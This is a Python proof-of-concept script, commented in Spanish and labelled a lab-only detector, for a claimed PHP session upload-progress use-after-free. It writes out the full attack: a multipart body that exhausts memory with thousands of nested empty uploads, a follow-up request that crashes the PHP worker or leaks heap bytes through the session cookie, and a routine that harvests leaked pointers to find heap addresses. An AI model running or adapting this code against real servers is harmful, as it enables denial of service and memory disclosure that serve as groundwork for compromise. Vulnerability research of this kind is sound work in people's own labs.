#!/usr/bin/env python3
"""
php2shell_leak.py — Detector/verificador del UAF de PHP2Shell
(CVE-2026-109618 / CVE-2026-109619) vía la rama upload-progress.

SOLO PARA LABORATORIO PROPIO. Herramienta de INVESTIGACIÓN y DETECCIÓN.

=============================================================================
MECANISMO (verificado contra el código fuente de PHP 8.2.34, el parche oficial
31c0ea7d7ff y el comportamiento observado en el laboratorio)
=============================================================================

Request A — "el OOM":
  multipart CON un file part + campo PHP_SESSION_UPLOAD_PROGRESS.
    -> MULTIPART_EVENT_FILE_START llama a php_rinit_session(0) y a
       php_session_rfc1867_update() ANTES de que PG(modules_activated)=1.
    -> PS(id) y PS(http_session_vars) quedan apuntando al heap de la request.
    -> El parseo multipart agota memory_limit -> zend_bailout() (un longjmp).
       MULTIPART_EVENT_END se salta, y como PG(modules_activated) sigue a 0,
       el RSHUTDOWN del modulo de session NO se ejecuta.
    -> shutdown_memory_manager() se ejecuta igual: EL HEAP SE LIBERA.
    -> El worker sobrevive con PS(id) y PS(http_session_vars) COLGANDO.

Request B — "el consumidor":
  multipart SIN file part, mismo PHPSESSID, mismo worker.
    -> No pasa por FILE_START, luego no hay reset.
    -> MULTIPART_EVENT_END -> php_session_rfc1867_cleanup() ->
       php_session_initialize() -> lee el PS(id) colgando.
    -> Si PS(id) es un zend_string liberado, su contenido es BASURA DE HEAP.
       PHP lo valida y o bien lo rechaza ("Session ID is too long or contains
       illegal characters") o bien lee basura -> SIGSEGV.

=============================================================================
TRIGGER DE OOM (Calif Research)
=============================================================================
Un file part con filename="" (vacio) no cuenta para max_file_uploads, pero
PHP SI crea las seis entradas de $_FILES por cada anidacion files[a][b][c]...
Miles de esos registros agotan memory_limit manteniendo el cuerpo HTTP
por debajo de post_max_size.

TRUCO CLAVE: cada upload debe tener un nombre TOP-LEVEL DISTINTO (f0, f1, ...).
Si todos comparten el mismo prefijo, PHP los fusiona en un unico arbol
$_FILES y NO se crea presion de memoria real. Es un fallo silencioso.

=============================================================================
CONTROLES EXPERIMENTALES (verificados)
=============================================================================
  OOM + Request B con upload_progress   -> CRASH (50%) o "Session ID too long" (50%)
  OOM + Request B normal (GET)           -> OK 6/6   (el worker esta sano)
  SIN OOM + Request B con upload_progress -> OK 5/5   (el OOM es necesario)

El fallo es por tanto un UAF DIRIGIDO, no una corrupcion general del allocator.
"""

from __future__ import annotations

import argparse
import random
import socket
import string
import sys
import threading
import time
import urllib.parse


def rand_str(n: int) -> str:
    alpha = string.ascii_letters + string.digits
    return "".join(random.choice(alpha) for _ in range(n))


def build_multipart(parts, boundary: str) -> bytes:
    out = bytearray()
    for p in parts:
        out += f"--{boundary}\r\n".encode()
        out += f'Content-Disposition: form-data; name="{p["name"]}"\r\n'.encode()
        if p.get("filename") is not None:
            out += f'; filename="{p["filename"]}"\r\n'.encode()
            out += b"Content-Type: application/octet-stream\r\n"
        out += b"\r\n" + p["data"] + b"\r\n"
    out += f"--{boundary}--\r\n".encode()
    return bytes(out)


def post_raw(host: str, port: int, path: str, body: bytes, boundary: str,
             cookie: str = "", timeout: float = 60.0) -> bytes:
    """POST que devuelve la respuesta cruda (incluye cabeceras).
    Una respuesta vacia significa que el worker ha crasheado (SIGSEGV)."""
    hdr = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
    )
    if cookie:
        hdr += f"Cookie: {cookie}\r\n"
    hdr += (
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n"
        "\r\n"
    )
    s = socket.create_connection((host, port), timeout=timeout)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.settimeout(timeout)
    data = bytearray()

    def _reader():
        try:
            while len(data) < (1 << 22):
                chunk = s.recv(65536)
                if not chunk:
                    break
                data.extend(chunk)
        except OSError:
            pass

    r = threading.Thread(target=_reader, daemon=True)
    r.start()
    try:
        try:
            s.sendall(hdr.encode() + body)
        except OSError:
            pass
        r.join(timeout=timeout + 2)
    finally:
        s.close()
    return bytes(data)


def get_raw(host: str, port: int, path: str, timeout: float = 15.0) -> bytes:
    """GET simple. Respuesta vacia = el worker crasheo."""
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode())
    data = bytearray()
    try:
        while True:
            c = s.recv(65536)
            if not c:
                break
            data.extend(c)
    except OSError:
        pass
    s.close()
    return bytes(data)


def build_oom_body(boundary: str, depth: int, records: int) -> bytes:
    """Cuerpo multipart que agota memory_limit con uploads anidados vacios.

    Cada registro usa un nombre TOP-LEVEL DISTINTO (f0, f1, ...) — es
    imprescindible: con prefijo compartido PHP fusiona los arboles y no
    hay presion de memoria.
    """
    parts = [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        # Un file part real: dispara FILE_START (php_rinit_session + update).
        {"name": "fz", "filename": "a.txt", "data": b"A" * 64},
    ]
    for i in range(records):
        name = f"f{i}[" + "][".join(f"a{j}" for j in range(depth)) + "]"
        parts.append({"name": name, "filename": "", "data": b""})
    return build_multipart(parts, boundary)


def build_probe_body(boundary: str, sid: str) -> bytes:
    """Request B: multipart SIN file part -> llega a MULTIPART_EVENT_END."""
    parts = [
        {"name": "PHPSESSID", "data": sid.encode()},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    return build_multipart(parts, boundary)


def build_clean_body(boundary: str, sid: str) -> bytes:
    """Request A 'limpio': upload normal, sin OOM (control negativo)."""
    parts = [
        {"name": "PHPSESSID", "data": sid.encode()},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "fz", "filename": "a.txt", "data": b"A" * 64},
    ]
    return build_multipart(parts, boundary)


def extract_session_cookie(resp: bytes) -> bytes:
    head = resp.split(b"\r\n\r\n", 1)[0]
    for line in head.split(b"\r\n"):
        if line.lower().startswith(b"set-cookie:") and b"PHPSESSID=" in line:
            return line.split(b"PHPSESSID=", 1)[1].split(b";", 1)[0]
    return b""


def find_pointers(raw: bytes, lo: int = 0x7F0000000000,
                  hi: int = 0x800000000000) -> list[int]:
    out = []
    for i in range(max(0, len(raw) - 8)):
        v = int.from_bytes(raw[i:i + 8], "little")
        if lo <= v < hi:
            out.append(v)
    return out


def classify(resp_b: bytes) -> str:
    """Clasifica la respuesta del Request B."""
    if len(resp_b) == 0:
        return "crash"
    if b"too long or contains" in resp_b:
        return "stale_sid"
    if b"Failed to read session data" in resp_b:
        return "stale_sid"
    if b"HTTP/1.1 200" in resp_b and b"Fatal" not in resp_b:
        return "ok"
    return "other"


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Detector del UAF PHP2Shell (upload-progress). Solo laboratorio propio.")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8082)
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--depth", type=int, default=12,
                    help="Nivel de anidamiento files[a][b][c]...")
    ap.add_argument("--records", type=int, default=3000,
                    help="Numero de uploads vacios anidados")
    ap.add_argument("--timeout", type=float, default=90.0)
    ap.add_argument("--rounds", type=int, default=10)
    ap.add_argument("--controls", action="store_true",
                    help="Ejecutar tambien los controles negativos")
    ap.add_argument("--keep-raw", default="",
                    help="Guardar la cookie cruda en este fichero")
    args = ap.parse_args()

    stats = {"crash": 0, "stale_sid": 0, "ok": 0, "other": 0}
    oom_confirmed = 0
    leaks = []

    for rnd in range(1, args.rounds + 1):
        sid = rand_str(24)
        print(f"[*] Ronda {rnd}/{args.rounds}  sid={sid}")

        # ---- Request A: provocar el OOM ----
        boundary = rand_str(20)
        body_a = build_oom_body(boundary, args.depth, args.records)
        resp_a = post_raw(args.host, args.port, args.path, body_a, boundary,
                          cookie=f"PHPSESSID={sid}", timeout=args.timeout)
        is_oom = b"exhausted" in resp_a
        if is_oom:
            oom_confirmed += 1
        print(f"    Request A: {len(body_a)} bytes HTTP "
              f"(depth={args.depth}, records={args.records}) -> "
              f"{'OOM CONFIRMADO' if is_oom else 'sin OOM'}")
        if not is_oom:
            print("    -> el OOM no se disparo; se aborta la ronda")
            time.sleep(0.3)
            continue

        time.sleep(0.15)

        # ---- Request B: consumir el estado colgante ----
        b2 = rand_str(20)
        body_b = build_probe_body(b2, sid)
        resp_b = post_raw(args.host, args.port, args.path, body_b, b2,
                          cookie=f"PHPSESSID={sid}", timeout=25.0)
        kind = classify(resp_b)
        stats[kind] = stats.get(kind, 0) + 1
        print(f"    Request B: {kind}")

        cookie = extract_session_cookie(resp_b)
        if cookie and len(cookie) > 40:
            print(f"      Set-Cookie PHPSESSID de {len(cookie)} bytes -> LEAK")
            raw = urllib.parse.unquote_to_bytes(cookie.decode("latin-1"))
            leaks.append(raw)
            ptrs = find_pointers(raw)
            if ptrs:
                from collections import Counter
                c = Counter(p & ~0xFFFFF for p in ptrs)
                base, n = c.most_common(1)[0]
                print(f"      punteros: {len(ptrs)}, base de chunk comun: "
                      f"0x{base:x} (x{n})")
            if args.keep_raw:
                with open(args.keep_raw, "wb") as fh:
                    fh.write(raw)
                print(f"      cookie cruda guardada en {args.keep_raw}")
        time.sleep(0.25)

    # ---- Controles negativos ----
    ctrl = {}
    if args.controls:
        print("\n[*] CONTROL 1: Request B NORMAL (GET) tras el OOM")
        ok = crash = 0
        for _ in range(4):
            sid = rand_str(24)
            b = rand_str(20)
            body = build_oom_body(b, args.depth, args.records)
            post_raw(args.host, args.port, args.path, body, b,
                     cookie=f"PHPSESSID={sid}", timeout=args.timeout)
            time.sleep(0.15)
            g = get_raw(args.host, args.port, args.path)
            if len(g) == 0:
                crash += 1
            else:
                ok += 1
            time.sleep(0.2)
        ctrl["normal_after_oom"] = {"ok": ok, "crash": crash}
        print(f"    OK={ok} CRASH={crash}  (esperado: OK, el worker esta sano)")

        print("\n[*] CONTROL 2: Request B con upload_progress SIN OOM previo")
        ok = crash = 0
        for _ in range(4):
            sid = rand_str(24)
            b = rand_str(20)
            body = build_clean_body(b, sid)
            post_raw(args.host, args.port, args.path, body, b,
                     cookie=f"PHPSESSID={sid}", timeout=30)
            time.sleep(0.15)
            b2 = rand_str(20)
            rb = post_raw(args.host, args.port, args.path,
                          build_probe_body(b2, sid), b2,
                          cookie=f"PHPSESSID={sid}", timeout=25)
            if len(rb) == 0:
                crash += 1
            else:
                ok += 1
            time.sleep(0.2)
        ctrl["no_oom"] = {"ok": ok, "crash": crash}
        print(f"    OK={ok} CRASH={crash}  (esperado: OK, el OOM es necesario)")

    # ---- Veredicto ----
    print("\n" + "=" * 66)
    print(f"OOM confirmado:            {oom_confirmed}/{args.rounds}")
    print(f"Request B -> crash:        {stats['crash']}")
    print(f"Request B -> stale SID:    {stats['stale_sid']}   "
          f"('Session ID is too long' = UAF leido)")
    print(f"Request B -> ok:           {stats['ok']}")
    print(f"Request B -> otro:         {stats['other']}")
    if ctrl:
        print(f"Control GET tras OOM:      {ctrl['normal_after_oom']}")
        print(f"Control sin OOM:           {ctrl['no_oom']}")
    print("=" * 66)

    affected = stats["crash"] + stats["stale_sid"]
    if affected:
        print(f"\n[+] VULNERABLE: el estado colgante se consumio en {affected} "
              f"de {args.rounds} rondas.")
        return 0
    print("\n[-] No se observo el UAF en esta ejecucion "
          "(puede ser variabilidad del heap; repetir con mas rondas).")
    return 1


if __name__ == "__main__":
    sys.exit(main())
